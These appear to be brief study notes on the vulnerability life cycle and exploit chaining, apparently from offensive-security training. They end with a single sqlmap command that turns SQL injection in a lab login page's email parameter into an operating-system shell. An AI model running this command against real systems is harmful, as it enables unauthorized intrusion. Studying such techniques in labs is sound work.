# Weaponization
- Vulnerability life cycle, DOD iplemented implemented VDP https://www.dc3.mil/Missions/Vulnerability-Disclosure/Vulnerability-Disclosure-Program-VDP/ .
- Product launched.
- Vulnerability Discovered.
- Development of POC.
- Dev of patch.
- Patch Released.
- Patch Applied.
- 0-day, n-day means patch has been released, n number of days patch released.

# Exploit chaining
- use multiple exploit.
- Recon, initial exploit, Priv Esc, Perisstence, Lateral Move, RCE.

<!--StartFragment-->

sqlmap -u "http://10.10.11.109/ai/includes/user\_login.php?email=test%40chatai.com\&password=123" -p email --os-shell

<!--EndFragment-->
